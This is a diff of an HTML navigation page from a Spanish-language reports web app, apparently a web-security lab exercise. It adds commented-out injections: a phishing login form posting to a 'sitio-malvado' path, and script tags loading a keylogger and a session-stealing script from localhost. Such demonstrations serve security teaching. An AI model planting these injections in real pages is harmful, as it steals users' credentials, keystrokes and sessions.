@@ -13,11 +13,14 @@
 			<a href="informes">Listar informes</a>
 		</li>
 		<li>
-			<a href="crear-informe.html">Crear informe</a>
+			<a href="nuevo-informe">Crear informe</a>
 		</li>
 		<li>
 			<a href="logout">Logout</a>
 		</li>
 	</ul>
+<!-- 	<form action="/sitio-malvado/phising" method="POST"><input type="text" name="user" placeholder="Username"><input type="password" name="pass" placeholder="Password"><button type="submit">Login</button></form> -->
+<!-- <script src="http://localhost:8080/sitio-malvado/js/key-logger.js"></script> -->
+<!-- <script src="http://localhost:8080/sitio-malvado/js/robo-session.js"></script> -->
 </body>
 </html>
